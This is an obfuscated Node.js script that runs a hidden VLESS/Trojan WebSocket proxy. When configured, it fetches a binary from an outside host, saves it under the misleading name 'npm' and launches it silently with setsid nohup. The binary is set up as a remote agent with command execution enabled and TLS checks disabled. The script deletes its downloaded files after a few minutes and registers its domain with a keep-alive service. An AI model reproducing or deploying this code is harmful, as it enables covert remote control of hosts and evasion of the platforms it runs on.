const _0x1e701e=_0x35ab;(function(_0x200539,_0x4147b9){const _0x20a486=_0x35ab,_0x3a4edd=_0x200539();while(!![]){try{const _0x32fbb2=parseInt(_0x20a486(0x163))/0x1+-parseInt(_0x20a486(0x165))/0x2+-parseInt(_0x20a486(0x17b))/0x3*(-parseInt(_0x20a486(0x181))/0x4)+-parseInt(_0x20a486(0x195))/0x5*(parseInt(_0x20a486(0x144))/0x6)+-parseInt(_0x20a486(0x18c))/0x7+parseInt(_0x20a486(0x1a3))/0x8+parseInt(_0x20a486(0x14f))/0x9;if(_0x32fbb2===_0x4147b9)break;else _0x3a4edd['push'](_0x3a4edd['shift']());}catch(_0x48a0d5){_0x3a4edd['push'](_0x3a4edd['shift']());}}}(_0x4b86,0x19943));const os=require('os'),http=require(_0x1e701e(0x1bb)),fs=require('fs'),axios=require(_0x1e701e(0x17c)),net=require(_0x1e701e(0x186)),path=require(_0x1e701e(0x197)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x1e701e(0x18d)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x1e701e(0x14d)][_0x1e701e(0x153)]||_0x1e701e(0x17a),NEZHA_SERVER=process[_0x1e701e(0x14d)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x1e701e(0x14d)][_0x1e701e(0x15d)]||'',NEZHA_KEY=process['env'][_0x1e701e(0x189)]||'',DOMAIN=process[_0x1e701e(0x14d)][_0x1e701e(0x19c)]||'1234.abc.com',AUTO_ACCESS=process[_0x1e701e(0x14d)]['AUTO_ACCESS']||!![],WSPATH=process[_0x1e701e(0x14d)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x1e701e(0x14d)][_0x1e701e(0x155)]||_0x1e701e(0x1ad),NAME=process[_0x1e701e(0x14d)][_0x1e701e(0x19a)]||'',PORT=process[_0x1e701e(0x14d)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1cd820=_0x1e701e;try{const _0x3c7367=await axios[_0x1cd820(0x179)](_0x1cd820(0x157)),_0x4ad962=_0x3c7367[_0x1cd820(0x1ab)];ISP=(_0x4ad962[_0x1cd820(0x143)]+'-'+_0x4ad962[_0x1cd820(0x15b)])['replace'](/ /g,'_');}catch(_0x21e1d5){ISP=_0x1cd820(0x1bf);}};function _0x35ab(_0x39040f,_0x50f93d){_0x39040f=_0x39040f-0x13f;const _0x4b864b=_0x4b86();let _0x35ab06=_0x4b864b[_0x39040f];return _0x35ab06;}function _0x4b86(){const _0x2384b2=['Hello\x20world!','http','concat','application/dns-json','Server\x20is\x20running\x20on\x20port\x20','Unknown','https://','post','url','pop','country_code','139542zsIRUH','toString','npm\x20running\x20error:','2053','every','vless://','writeHead','text/plain','write','env','join','617346xiGMrn','readUInt16BE','utf8','Server','UUID','--tls','SUB_PATH','https://oooo.serv00.net/add-url','https://api.ip.sb/geoip','https://amd64.ssss.nyc.mn/v1','createHash','pipe','isp','error','NEZHA_PORT','Automatic\x20Access\x20Task\x20added\x20successfully','test','connection','&fp=chrome&type=ws&host=','2087','43322WNBodR','error:\x20','313530SkeEvc','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','\x20-p\x20','config.yaml','createServer','https://amd64.ssss.nyc.mn/agent','substr','from','once','utf-8','https://dns.google/resolve?name=','&type=A','reduce',':443?encryption=none&security=tls&sni=','2096',':443?security=tls&sni=','catch','npm\x20is\x20already\x20running,\x20skip\x20running...','aarch64','stream','get','a2e05e3a-e883-4570-8369-8a57c6b0e572','1224Zkbhku','axios','sha224','\x20with\x20all\x20DNS\x20servers','replace','createWriteStream','1384qIDekY','Status','8.8.4.4','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','end','net','digest','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','NEZHA_KEY','443','readUInt8','538699mleOax','child_process','includes','listen','chmod\x20+x\x20npm','trojan://','map','1.1.1.1','connect','25FGNpsU','npm\x20is\x20running','path','arm64','&path=%2F','NAME','https://arm64.ssss.nyc.mn/agent','DOMAIN','writeFileSync','hex','log','slice','Not\x20Found\x0a','8443','1613552YKhcRW','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','type','decode','unlink','base64','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','Answer','data','message','a2e05e3a','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','index.html','send','arm','npm','finish','length','find','arch','https://arm64.ssss.nyc.mn/v1','then','application/json'];_0x4b86=function(){return _0x2384b2;};return _0x4b86();}GetISP();const httpServer=http[_0x1e701e(0x169)]((_0x171b97,_0xca2109)=>{const _0x14737b=_0x1e701e;if(_0x171b97[_0x14737b(0x141)]==='/'){const _0x5a9c86=path[_0x14737b(0x14e)](__dirname,_0x14737b(0x1af));fs['readFile'](_0x5a9c86,_0x14737b(0x151),(_0x22ce06,_0x1aa597)=>{const _0x1b9df4=_0x14737b;if(_0x22ce06){_0xca2109['writeHead'](0xc8,{'Content-Type':'text/html'}),_0xca2109[_0x1b9df4(0x185)](_0x1b9df4(0x1ba));return;}_0xca2109[_0x1b9df4(0x14a)](0xc8,{'Content-Type':'text/html'}),_0xca2109[_0x1b9df4(0x185)](_0x1aa597);});return;}else{if(_0x171b97[_0x14737b(0x141)]==='/'+SUB_PATH){const _0x4152a3=NAME?NAME+'-'+ISP:ISP,_0x297c63=_0x14737b(0x149)+UUID+'@'+DOMAIN+_0x14737b(0x172)+DOMAIN+_0x14737b(0x161)+DOMAIN+_0x14737b(0x199)+WSPATH+'#'+_0x4152a3,_0x5a81b2=_0x14737b(0x191)+UUID+'@'+DOMAIN+_0x14737b(0x174)+DOMAIN+_0x14737b(0x161)+DOMAIN+_0x14737b(0x199)+WSPATH+'#'+_0x4152a3,_0x2d6a17=_0x297c63+'\x0a'+_0x5a81b2,_0x29cf2b=Buffer[_0x14737b(0x16c)](_0x2d6a17)[_0x14737b(0x145)](_0x14737b(0x1a8));_0xca2109[_0x14737b(0x14a)](0xc8,{'Content-Type':_0x14737b(0x14b)}),_0xca2109[_0x14737b(0x185)](_0x29cf2b+'\x0a');}else _0xca2109[_0x14737b(0x14a)](0x194,{'Content-Type':'text/plain'}),_0xca2109[_0x14737b(0x185)](_0x14737b(0x1a1));}}),wss=new WebSocket[(_0x1e701e(0x152))]({'server':httpServer}),uuid=UUID[_0x1e701e(0x17f)](/-/g,''),DNS_SERVERS=[_0x1e701e(0x183),_0x1e701e(0x193)];function resolveHost(_0x418a95){return new Promise((_0x18c399,_0x55831a)=>{const _0x48f459=_0x35ab;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x48f459(0x15f)](_0x418a95)){_0x18c399(_0x418a95);return;}let _0x36df12=0x0;function _0x3a0595(){const _0x4662be=_0x48f459;if(_0x36df12>=DNS_SERVERS['length']){_0x55831a(new Error('Failed\x20to\x20resolve\x20'+_0x418a95+_0x4662be(0x17e)));return;}const _0x4144d0=DNS_SERVERS[_0x36df12];_0x36df12++;const _0x30d56a=_0x4662be(0x16f)+encodeURIComponent(_0x418a95)+_0x4662be(0x170);axios[_0x4662be(0x179)](_0x30d56a,{'timeout':0x1388,'headers':{'Accept':_0x4662be(0x1bd)}})['then'](_0x4bc04c=>{const _0x19179a=_0x4662be,_0xfab4c2=_0x4bc04c[_0x19179a(0x1ab)];if(_0xfab4c2[_0x19179a(0x182)]===0x0&&_0xfab4c2['Answer']&&_0xfab4c2[_0x19179a(0x1aa)]['length']>0x0){const _0x392339=_0xfab4c2[_0x19179a(0x1aa)][_0x19179a(0x1b5)](_0x9f2c48=>_0x9f2c48[_0x19179a(0x1a5)]===0x1);if(_0x392339){_0x18c399(_0x392339[_0x19179a(0x1ab)]);return;}}_0x3a0595();})[_0x4662be(0x175)](_0x2f7887=>{_0x3a0595();});}_0x3a0595();});}function handleVlessConnection(_0x3a550b,_0x4e4844){const _0x3f1315=_0x1e701e,[_0x39838c]=_0x4e4844,_0xd34c86=_0x4e4844[_0x3f1315(0x1a0)](0x1,0x11);if(!_0xd34c86[_0x3f1315(0x148)]((_0x4705d1,_0x32822b)=>_0x4705d1==parseInt(uuid[_0x3f1315(0x16b)](_0x32822b*0x2,0x2),0x10)))return![];let _0x1fe000=_0x4e4844[_0x3f1315(0x1a0)](0x11,0x12)[_0x3f1315(0x18b)]()+0x13;const _0x1b7482=_0x4e4844['slice'](_0x1fe000,_0x1fe000+=0x2)[_0x3f1315(0x150)](0x0),_0xa86cb3=_0x4e4844['slice'](_0x1fe000,_0x1fe000+=0x1)[_0x3f1315(0x18b)](),_0xbc5981=_0xa86cb3==0x1?_0x4e4844[_0x3f1315(0x1a0)](_0x1fe000,_0x1fe000+=0x4)['join']('.'):_0xa86cb3==0x2?new TextDecoder()[_0x3f1315(0x1a6)](_0x4e4844[_0x3f1315(0x1a0)](_0x1fe000+0x1,_0x1fe000+=0x1+_0x4e4844[_0x3f1315(0x1a0)](_0x1fe000,_0x1fe000+0x1)[_0x3f1315(0x18b)]())):_0xa86cb3==0x3?_0x4e4844[_0x3f1315(0x1a0)](_0x1fe000,_0x1fe000+=0x10)[_0x3f1315(0x171)]((_0x53c228,_0x10dbc3,_0x466562,_0x430a7a)=>_0x466562%0x2?_0x53c228[_0x3f1315(0x1bc)](_0x430a7a[_0x3f1315(0x1a0)](_0x466562-0x1,_0x466562+0x1)):_0x53c228,[])[_0x3f1315(0x192)](_0x3f4cba=>_0x3f4cba[_0x3f1315(0x150)](0x0)[_0x3f1315(0x145)](0x10))['join'](':'):'';_0x3a550b[_0x3f1315(0x1b0)](new Uint8Array([_0x39838c,0x0]));const _0xc47b6f=createWebSocketStream(_0x3a550b);return resolveHost(_0xbc5981)[_0x3f1315(0x1b8)](_0xbeed28=>{const _0x581805=_0x3f1315;net[_0x581805(0x194)]({'host':_0xbeed28,'port':_0x1b7482},function(){const _0x4a056a=_0x581805;this[_0x4a056a(0x14c)](_0x4e4844['slice'](_0x1fe000)),_0xc47b6f['on'](_0x4a056a(0x15c),()=>{})['pipe'](this)['on'](_0x4a056a(0x15c),()=>{})[_0x4a056a(0x15a)](_0xc47b6f);})['on'](_0x581805(0x15c),()=>{});})[_0x3f1315(0x175)](_0x7ebfa0=>{const _0x2efe9d=_0x3f1315;net[_0x2efe9d(0x194)]({'host':_0xbc5981,'port':_0x1b7482},function(){const _0x1f4c7b=_0x2efe9d;this[_0x1f4c7b(0x14c)](_0x4e4844[_0x1f4c7b(0x1a0)](_0x1fe000)),_0xc47b6f['on'](_0x1f4c7b(0x15c),()=>{})['pipe'](this)['on'](_0x1f4c7b(0x15c),()=>{})[_0x1f4c7b(0x15a)](_0xc47b6f);})['on'](_0x2efe9d(0x15c),()=>{});}),!![];}function handleTrojanConnection(_0x220af0,_0x1cb439){const _0xd0d4f1=_0x1e701e;try{if(_0x1cb439[_0xd0d4f1(0x1b4)]<0x3a)return![];const _0x11a017=_0x1cb439[_0xd0d4f1(0x1a0)](0x0,0x38)[_0xd0d4f1(0x145)](),_0x1f0c48=[UUID];let _0x46ad47=null;for(const _0x11b699 of _0x1f0c48){const _0x558b5b=crypto[_0xd0d4f1(0x159)](_0xd0d4f1(0x17d))['update'](_0x11b699)[_0xd0d4f1(0x187)](_0xd0d4f1(0x19e));if(_0x558b5b===_0x11a017){_0x46ad47=_0x11b699;break;}}if(!_0x46ad47)return![];let _0x22854a=0x38;_0x1cb439[_0x22854a]===0xd&&_0x1cb439[_0x22854a+0x1]===0xa&&(_0x22854a+=0x2);const _0x50c045=_0x1cb439[_0x22854a];if(_0x50c045!==0x1)return![];_0x22854a+=0x1;const _0x3cb270=_0x1cb439[_0x22854a];_0x22854a+=0x1;let _0x43d132,_0x29ccbe;if(_0x3cb270===0x1)_0x43d132=_0x1cb439[_0xd0d4f1(0x1a0)](_0x22854a,_0x22854a+0x4)[_0xd0d4f1(0x14e)]('.'),_0x22854a+=0x4;else{if(_0x3cb270===0x3){const _0x18d0d6=_0x1cb439[_0x22854a];_0x22854a+=0x1,_0x43d132=_0x1cb439[_0xd0d4f1(0x1a0)](_0x22854a,_0x22854a+_0x18d0d6)[_0xd0d4f1(0x145)](),_0x22854a+=_0x18d0d6;}else{if(_0x3cb270===0x4)_0x43d132=_0x1cb439[_0xd0d4f1(0x1a0)](_0x22854a,_0x22854a+0x10)['reduce']((_0x1e72db,_0x659a75,_0x3dca01,_0x1ecbe4)=>_0x3dca01%0x2?_0x1e72db[_0xd0d4f1(0x1bc)](_0x1ecbe4['slice'](_0x3dca01-0x1,_0x3dca01+0x1)):_0x1e72db,[])['map'](_0x5278af=>_0x5278af[_0xd0d4f1(0x150)](0x0)['toString'](0x10))[_0xd0d4f1(0x14e)](':'),_0x22854a+=0x10;else return![];}}_0x29ccbe=_0x1cb439['readUInt16BE'](_0x22854a),_0x22854a+=0x2;_0x22854a<_0x1cb439[_0xd0d4f1(0x1b4)]&&_0x1cb439[_0x22854a]===0xd&&_0x1cb439[_0x22854a+0x1]===0xa&&(_0x22854a+=0x2);const _0x44e652=createWebSocketStream(_0x220af0);return resolveHost(_0x43d132)[_0xd0d4f1(0x1b8)](_0xa72574=>{const _0x3e40d5=_0xd0d4f1;net[_0x3e40d5(0x194)]({'host':_0xa72574,'port':_0x29ccbe},function(){const _0x580472=_0x3e40d5;_0x22854a<_0x1cb439[_0x580472(0x1b4)]&&this[_0x580472(0x14c)](_0x1cb439[_0x580472(0x1a0)](_0x22854a)),_0x44e652['on'](_0x580472(0x15c),()=>{})['pipe'](this)['on'](_0x580472(0x15c),()=>{})['pipe'](_0x44e652);})['on']('error',()=>{});})[_0xd0d4f1(0x175)](_0x486060=>{const _0x4d72d8=_0xd0d4f1;net[_0x4d72d8(0x194)]({'host':_0x43d132,'port':_0x29ccbe},function(){const _0x1ddc06=_0x4d72d8;_0x22854a<_0x1cb439[_0x1ddc06(0x1b4)]&&this[_0x1ddc06(0x14c)](_0x1cb439[_0x1ddc06(0x1a0)](_0x22854a)),_0x44e652['on'](_0x1ddc06(0x15c),()=>{})[_0x1ddc06(0x15a)](this)['on'](_0x1ddc06(0x15c),()=>{})[_0x1ddc06(0x15a)](_0x44e652);})['on'](_0x4d72d8(0x15c),()=>{});}),!![];}catch(_0x3bd7a2){return![];}}wss['on'](_0x1e701e(0x160),(_0x28c3bb,_0x51f427)=>{const _0x5556df=_0x1e701e,_0x3b200a=_0x51f427[_0x5556df(0x141)]||'';_0x28c3bb[_0x5556df(0x16d)](_0x5556df(0x1ac),_0x5a2123=>{const _0x3e49ec=_0x5556df;if(_0x5a2123[_0x3e49ec(0x1b4)]>0x11&&_0x5a2123[0x0]===0x0){const _0x4ef62f=_0x5a2123[_0x3e49ec(0x1a0)](0x1,0x11),_0x5bf54b=_0x4ef62f[_0x3e49ec(0x148)]((_0x37e875,_0xbbc73)=>_0x37e875==parseInt(uuid[_0x3e49ec(0x16b)](_0xbbc73*0x2,0x2),0x10));if(_0x5bf54b){!handleVlessConnection(_0x28c3bb,_0x5a2123)&&_0x28c3bb['close']();return;}}!handleTrojanConnection(_0x28c3bb,_0x5a2123)&&_0x28c3bb['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x6b4207=_0x1e701e,_0x2bc0d1=os[_0x6b4207(0x1b6)]();return _0x2bc0d1===_0x6b4207(0x1b1)||_0x2bc0d1===_0x6b4207(0x198)||_0x2bc0d1===_0x6b4207(0x177)?!NEZHA_PORT?_0x6b4207(0x1b7):_0x6b4207(0x19b):!NEZHA_PORT?_0x6b4207(0x158):_0x6b4207(0x16a);},downloadFile=async()=>{const _0x4da045=_0x1e701e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x18a601=getDownloadUrl(),_0x2d47bc=await axios({'method':_0x4da045(0x179),'url':_0x18a601,'responseType':_0x4da045(0x178)}),_0x59354e=fs[_0x4da045(0x180)](_0x4da045(0x1b2));return _0x2d47bc['data'][_0x4da045(0x15a)](_0x59354e),new Promise((_0x2a1fe3,_0x10f63e)=>{const _0x17aec6=_0x4da045;_0x59354e['on'](_0x17aec6(0x1b3),()=>{const _0x3a2832=_0x17aec6;console[_0x3a2832(0x19f)]('npm\x20download\x20successfully'),exec(_0x3a2832(0x190),_0x31ecf1=>{if(_0x31ecf1)_0x10f63e(_0x31ecf1);_0x2a1fe3();});}),_0x59354e['on'](_0x17aec6(0x15c),_0x10f63e);});}catch(_0x80798c){throw _0x80798c;}},runnz=async()=>{const _0x51bc3c=_0x1e701e;try{const _0x52feb2=execSync(_0x51bc3c(0x1a9),{'encoding':_0x51bc3c(0x16e)});if(_0x52feb2['trim']()!==''){console[_0x51bc3c(0x19f)](_0x51bc3c(0x176));return;}}catch(_0x3313d5){}await downloadFile();let _0x451a28='',_0x4cc8eb=[_0x51bc3c(0x18a),_0x51bc3c(0x1a2),_0x51bc3c(0x173),_0x51bc3c(0x162),'2083',_0x51bc3c(0x147)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5b624c=_0x4cc8eb[_0x51bc3c(0x18e)](NEZHA_PORT)?_0x51bc3c(0x154):'';_0x451a28='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x51bc3c(0x167)+NEZHA_KEY+'\x20'+_0x5b624c+_0x51bc3c(0x188);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4ef485=NEZHA_SERVER[_0x51bc3c(0x18e)](':')?NEZHA_SERVER['split'](':')[_0x51bc3c(0x142)]():'',_0x3df630=_0x4cc8eb[_0x51bc3c(0x18e)](_0x4ef485)?'true':'false',_0x21284a='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x51bc3c(0x1ae)+_0x3df630+_0x51bc3c(0x184)+UUID;fs[_0x51bc3c(0x19d)](_0x51bc3c(0x168),_0x21284a);}_0x451a28=_0x51bc3c(0x1a4);}else{console[_0x51bc3c(0x19f)](_0x51bc3c(0x166));return;}}try{exec(_0x451a28,{'shell':'/bin/bash'},_0x1270e1=>{const _0x3cf95b=_0x51bc3c;if(_0x1270e1)console['error'](_0x3cf95b(0x146),_0x1270e1);else console['log'](_0x3cf95b(0x196));});}catch(_0x590f11){console[_0x51bc3c(0x15c)](_0x51bc3c(0x164)+_0x590f11);}};async function addAccessTask(){const _0x5038c4=_0x1e701e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x266a70=_0x5038c4(0x13f)+DOMAIN;try{const _0x199456=await axios[_0x5038c4(0x140)](_0x5038c4(0x156),{'url':_0x266a70},{'headers':{'Content-Type':_0x5038c4(0x1b9)}});console[_0x5038c4(0x19f)](_0x5038c4(0x15e));}catch(_0x27afc1){}}const delFiles=()=>{const _0x213c13=_0x1e701e;fs[_0x213c13(0x1a7)](_0x213c13(0x1b2),()=>{}),fs['unlink'](_0x213c13(0x168),()=>{});};httpServer[_0x1e701e(0x18f)](PORT,()=>{const _0x377d42=_0x1e701e;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x377d42(0x19f)](_0x377d42(0x1be)+PORT);});
